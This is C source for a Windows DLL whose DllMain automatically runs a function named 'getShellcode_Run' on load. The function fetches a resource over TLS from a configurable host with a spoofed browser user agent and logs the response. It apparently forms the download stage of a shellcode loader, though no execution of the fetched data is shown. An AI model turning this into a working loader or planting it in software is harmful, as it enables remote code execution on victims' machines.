#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#define SECURITY_WIN32
#include <sspi.h>
#include <schannel.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")

#define DEFAULT_BUFLEN 4096

// Update these to match your setup
char ip[] = "www.google.com";
char port[] = "443";
char resource[] = "";  // Empty resource for Google homepage

void getShellcode_Run(char* host, char* port, char* resource) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    char sendbuf[MAX_PATH] = "";
    char recvbuf[DEFAULT_BUFLEN];
    char sslBuf[32768];
    char *encryptedBuf = NULL;
    int iResult;
    int sslBufLen = 0;
    CredHandle hCred;
    CtxtHandle hContext;
    SECURITY_STATUS secStatus;
    SecBuffer bufs[4] = {0};
    SecBufferDesc message = {0};
    char fullResponse[65536] = {0};
    int fullResponseLen = 0;
    int totalSize = 0;

    // Build proper HTTP request with cache-control headers
    sprintf_s(sendbuf, MAX_PATH, 
        "GET /%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
        "\r\n", 
        resource, host);
    OutputDebugStringA("HTTP Request: ");
    OutputDebugStringA(sendbuf);

    // Initialize Winsock
    OutputDebugStringA("Initializing Winsock...\n");
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "WSAStartup failed: %d\n", iResult);
        OutputDebugStringA(errorMsg);
        return;
    }
    OutputDebugStringA("Winsock initialized successfully\n");

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    OutputDebugStringA("Resolving hostname...\n");
    iResult = getaddrinfo(host, port, &hints, &result);
    if (iResult != 0) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "getaddrinfo failed: %d\n", iResult);
        OutputDebugStringA(errorMsg);
        WSACleanup();
        return;
    }
    OutputDebugStringA("Hostname resolved successfully\n");

    // Log resolved IP addresses
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        char ipStr[INET_ADDRSTRLEN];
        struct sockaddr_in *sa = (struct sockaddr_in *)ptr->ai_addr;
        inet_ntop(AF_INET, &(sa->sin_addr), ipStr, INET_ADDRSTRLEN);
        char logMsg[256];
        sprintf_s(logMsg, 256, "Resolved IP: %s\n", ipStr);
        OutputDebugStringA(logMsg);
    }

    // Create socket and connect
    OutputDebugStringA("Creating socket and connecting...\n");
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            char errorMsg[256];
            sprintf_s(errorMsg, 256, "socket failed: %d\n", WSAGetLastError());
            OutputDebugStringA(errorMsg);
            WSACleanup();
            return;
        }

        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            char errorMsg[256];
            sprintf_s(errorMsg, 256, "connect failed: %d\n", WSAGetLastError());
            OutputDebugStringA(errorMsg);
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        OutputDebugStringA("Unable to connect\n");
        WSACleanup();
        return;
    }
    OutputDebugStringA("Connected to server successfully\n");

    // Initialize SSL
    SCHANNEL_CRED schannelCred = {0};
    schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;  // Force TLS 1.2
    schannelCred.dwFlags = 0;

    OutputDebugStringA("Acquiring credentials handle...\n");
    secStatus = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL, &schannelCred, NULL, NULL, &hCred, NULL);
    if (secStatus != SEC_E_OK) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "AcquireCredentialsHandle failed: 0x%08X\n", secStatus);
        OutputDebugStringA(errorMsg);
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }
    OutputDebugStringA("Credentials handle acquired\n");

    // Perform SSL handshake
    SecBufferDesc outBuffer, inBuffer;
    SecBuffer outBuffers[1], inBuffers[2];
    DWORD dwFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY |
                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;

    outBuffers[0].pvBuffer = NULL;
    outBuffers[0].BufferType = SECBUFFER_TOKEN;
    outBuffers[0].cbBuffer = 0;
    outBuffer.cBuffers = 1;
    outBuffer.pBuffers = outBuffers;
    outBuffer.ulVersion = SECBUFFER_VERSION;

    OutputDebugStringA("Initializing security context (first call)...\n");
    secStatus = InitializeSecurityContextA(&hCred, NULL, host, dwFlags, 0, 0, NULL, 0, &hContext, &outBuffer, &dwFlags, NULL);
    if (secStatus != SEC_I_CONTINUE_NEEDED) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "InitializeSecurityContext (first call) failed: 0x%08X\n", secStatus);
        OutputDebugStringA(errorMsg);
        goto Cleanup;
    }
    OutputDebugStringA("Security context initialized (first call)\n");

    OutputDebugStringA("Sending initial handshake message...\n");
    iResult = send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
    if (iResult == SOCKET_ERROR) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "SSL handshake send failed: %d\n", WSAGetLastError());
        OutputDebugStringA(errorMsg);
        goto Cleanup;
    }
    OutputDebugStringA("Sent initial handshake message\n");
    FreeContextBuffer(outBuffers[0].pvBuffer);

    // Receive handshake response
    do {
        OutputDebugStringA("Receiving handshake response...\n");
        iResult = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
        if (iResult <= 0) {
            char errorMsg[256];
            sprintf_s(errorMsg, 256, "SSL handshake recv failed: %d\n", WSAGetLastError());
            OutputDebugStringA(errorMsg);
            goto Cleanup;
        }
        sslBufLen += iResult;
        char logMsg[256];
        sprintf_s(logMsg, 256, "Received %d bytes during handshake\n", iResult);
        OutputDebugStringA(logMsg);

        inBuffers[0].pvBuffer = sslBuf;
        inBuffers[0].cbBuffer = sslBufLen;
        inBuffers[0].BufferType = SECBUFFER_TOKEN;
        inBuffers[1].pvBuffer = NULL;
        inBuffers[1].cbBuffer = 0;
        inBuffers[1].BufferType = SECBUFFER_EMPTY;
        inBuffer.cBuffers = 2;
        inBuffer.pBuffers = inBuffers;
        inBuffer.ulVersion = SECBUFFER_VERSION;

        outBuffers[0].pvBuffer = NULL;
        outBuffers[0].cbBuffer = 0;
        outBuffers[0].BufferType = SECBUFFER_TOKEN;

        OutputDebugStringA("Processing handshake response...\n");
        secStatus = InitializeSecurityContextA(&hCred, &hContext, NULL, dwFlags, 0, 0, &inBuffer, 0, NULL, &outBuffer, &dwFlags, NULL);
        if (secStatus == SEC_E_OK) {
            OutputDebugStringA("SSL handshake completed successfully\n");
        } else if (secStatus == SEC_I_CONTINUE_NEEDED) {
            OutputDebugStringA("SSL handshake continuing...\n");
            if (outBuffers[0].pvBuffer) {
                iResult = send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
                FreeContextBuffer(outBuffers[0].pvBuffer);
                if (iResult == SOCKET_ERROR) {
                    char errorMsg[256];
                    sprintf_s(errorMsg, 256, "SSL handshake continuation send failed: %d\n", WSAGetLastError());
                    OutputDebugStringA(errorMsg);
                    goto Cleanup;
                }
            }
            sslBufLen = 0;  // Reset buffer for next iteration
        } else {
            char errorMsg[256];
            sprintf_s(errorMsg, 256, "InitializeSecurityContext (subsequent call) failed: 0x%08X\n", secStatus);
            OutputDebugStringA(errorMsg);
            goto Cleanup;
        }
    } while (secStatus == SEC_I_CONTINUE_NEEDED);

    if (secStatus != SEC_E_OK) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "SSL handshake failed: 0x%08X\n", secStatus);
        OutputDebugStringA(errorMsg);
        goto Cleanup;
    }

    // Log the negotiated cipher suite
    SecPkgContext_ConnectionInfo connInfo;
    secStatus = QueryContextAttributesA(&hContext, SECPKG_ATTR_CONNECTION_INFO, &connInfo);
    if (secStatus == SEC_E_OK) {
        char logMsg[256];
        sprintf_s(logMsg, 256, "Negotiated Protocol: 0x%04X, Cipher: 0x%04X\n", connInfo.dwProtocol, connInfo.aiCipher);
        OutputDebugStringA(logMsg);
    }

    // Encrypt and send the HTTP request
    SecPkgContext_StreamSizes sizes;
    OutputDebugStringA("Querying stream sizes...\n");
    secStatus = QueryContextAttributesA(&hContext, SECPKG_ATTR_STREAM_SIZES, &sizes);
    if (secStatus != SEC_E_OK) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "QueryContextAttributes failed: 0x%08X\n", secStatus);
        OutputDebugStringA(errorMsg);
        goto Cleanup;
    }

    char sizeMsg[256];
    sprintf_s(sizeMsg, 256, "Stream Sizes: Header=%u, MaxMessage=%u, Trailer=%u\n", sizes.cbHeader, sizes.cbMaximumMessage, sizes.cbTrailer);
    OutputDebugStringA(sizeMsg);

    OutputDebugStringA("Allocating buffer for encryption...\n");
    encryptedBuf = (char*)malloc(sizes.cbHeader + sizes.cbMaximumMessage + sizes.cbTrailer);
    if (!encryptedBuf) {
        OutputDebugStringA("malloc failed\n");
        goto Cleanup;
    }

    // Set up the buffers for encryption
    bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
    bufs[0].cbBuffer = sizes.cbHeader;
    bufs[0].pvBuffer = encryptedBuf;

    bufs[1].BufferType = SECBUFFER_DATA;
    bufs[1].cbBuffer = strlen(sendbuf);
    bufs[1].pvBuffer = encryptedBuf + sizes.cbHeader;
    memcpy(bufs[1].pvBuffer, sendbuf, bufs[1].cbBuffer);

    bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
    bufs[2].cbBuffer = sizes.cbTrailer;
    bufs[2].pvBuffer = encryptedBuf + sizes.cbHeader + bufs[1].cbBuffer;

    bufs[3].BufferType = SECBUFFER_EMPTY;
    bufs[3].cbBuffer = 0;
    bufs[3].pvBuffer = NULL;

    message.ulVersion = SECBUFFER_VERSION;
    message.cBuffers = 4;
    message.pBuffers = bufs;

    sprintf_s(sizeMsg, 256, "EncryptMessage Buffers: Header=%u, Data=%u, Trailer=%u\n", bufs[0].cbBuffer, bufs[1].cbBuffer, bufs[2].cbBuffer);
    OutputDebugStringA(sizeMsg);

    OutputDebugStringA("Encrypting message...\n");
    secStatus = EncryptMessage(&hContext, 0, &message, 0);
    if (secStatus != SEC_E_OK) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "EncryptMessage failed: 0x%08X\n", secStatus);
        OutputDebugStringA(errorMsg);
        goto Cleanup;
    }
    OutputDebugStringA("EncryptMessage succeeded\n");

    // Send the encrypted data (header + data + trailer)
    totalSize = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
    OutputDebugStringA("Sending encrypted HTTP request...\n");
    iResult = send(ConnectSocket, encryptedBuf, totalSize, 0);
    if (iResult == SOCKET_ERROR) {
        char errorMsg[256];
        sprintf_s(errorMsg, 256, "send failed: %d\n", WSAGetLastError());
        OutputDebugStringA(errorMsg);
        goto Cleanup;
    }
    OutputDebugStringA("Sent encrypted HTTP request\n");

    // Receive and decrypt the response
    sslBufLen = 0;
    int processedBytes = 0;
    do {
        OutputDebugStringA("Receiving response...\n");
        iResult = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
        if (iResult > 0) {
            sslBufLen += iResult;
            char logMsg[256];
            sprintf_s(logMsg, 256, "Received %d bytes of encrypted data (total: %d)\n", iResult, sslBufLen);
            OutputDebugStringA(logMsg);

            // Log the first few bytes of the received data (in hex) for debugging
            if (sslBufLen >= 5) {
                sprintf_s(logMsg, 256, "First 5 bytes (hex): %02X %02X %02X %02X %02X\n",
                    (unsigned char)sslBuf[0], (unsigned char)sslBuf[1],
                    (unsigned char)sslBuf[2], (unsigned char)sslBuf[3],
                    (unsigned char)sslBuf[4]);
                OutputDebugStringA(logMsg);
            }

            // Process the buffer in a loop to handle multiple TLS records
            processedBytes = 0;
            while (processedBytes < sslBufLen) {
                // Check if we have at least the TLS record header (5 bytes)
                if (sslBufLen - processedBytes < 5) {
                    OutputDebugStringA("Incomplete TLS record header, need more data\n");
                    break;
                }

                // Parse the TLS record length
                unsigned int recordLen = (unsigned char)sslBuf[processedBytes + 3] << 8 |
                                         (unsigned char)sslBuf[processedBytes + 4];
                unsigned int totalRecordLen = recordLen + 5;

                // Check if we have the full record
                if (sslBufLen - processedBytes < totalRecordLen) {
                    sprintf_s(logMsg, 256, "Incomplete TLS record (need %u bytes, have %d), need more data\n",
                              totalRecordLen, sslBufLen - processedBytes);
                    OutputDebugStringA(logMsg);
                    break;
                }

                // Set up buffers for decryption
                inBuffers[0].pvBuffer = sslBuf + processedBytes;
                inBuffers[0].cbBuffer = totalRecordLen;
                inBuffers[0].BufferType = SECBUFFER_DATA;
                inBuffers[1].BufferType = SECBUFFER_EMPTY;
                inBuffers[1].cbBuffer = 0;
                inBuffers[1].pvBuffer = NULL;
                inBuffer.cBuffers = 2;
                inBuffer.pBuffers = inBuffers;
                inBuffer.ulVersion = SECBUFFER_VERSION;

                OutputDebugStringA("Decrypting message...\n");
                secStatus = DecryptMessage(&hContext, &inBuffer, 0, NULL);
                if (secStatus == SEC_E_OK) {
                    int decryptedLen = inBuffers[1].cbBuffer;
                    sprintf_s(logMsg, 256, "Decrypted %d bytes\n", decryptedLen);
                    OutputDebugStringA(logMsg);
                    if (fullResponseLen + decryptedLen < sizeof(fullResponse)) {
                        memcpy(fullResponse + fullResponseLen, inBuffers[1].pvBuffer, decryptedLen);
                        fullResponseLen += decryptedLen;
                    }
                    processedBytes += totalRecordLen;
                } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
                    OutputDebugStringA("Incomplete message (unexpected), need more data\n");
                    break;
                } else {
                    char errorMsg[256];
                    sprintf_s(errorMsg, 256, "DecryptMessage failed: 0x%08X\n", secStatus);
                    OutputDebugStringA(errorMsg);
                    goto Cleanup;
                }
            }

            // Shift remaining data to the beginning of sslBuf
            if (processedBytes > 0 && processedBytes < sslBufLen) {
                memmove(sslBuf, sslBuf + processedBytes, sslBufLen - processedBytes);
            }
            sslBufLen -= processedBytes;
        } else if (iResult == 0) {
            OutputDebugStringA("Connection closed\n");
            break;
        } else {
            char errorMsg[256];
            sprintf_s(errorMsg, 256, "recv failed: %d\n", WSAGetLastError());
            OutputDebugStringA(errorMsg);
            break;
        }
    } while (true);

    // Parse the HTTP response
    if (fullResponseLen > 0) {
        fullResponse[fullResponseLen] = '\0';
        OutputDebugStringA("Full Response: ");
        OutputDebugStringA(fullResponse);
    } else {
        OutputDebugStringA("No data received\n");
    }

Cleanup:
    if (encryptedBuf) free(encryptedBuf);
    DeleteSecurityContext(&hContext);
    FreeCredentialsHandle(&hCred);
    closesocket(ConnectSocket);
    WSACleanup();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        getShellcode_Run(ip, port, resource);
        break;
    }
    return TRUE;
}
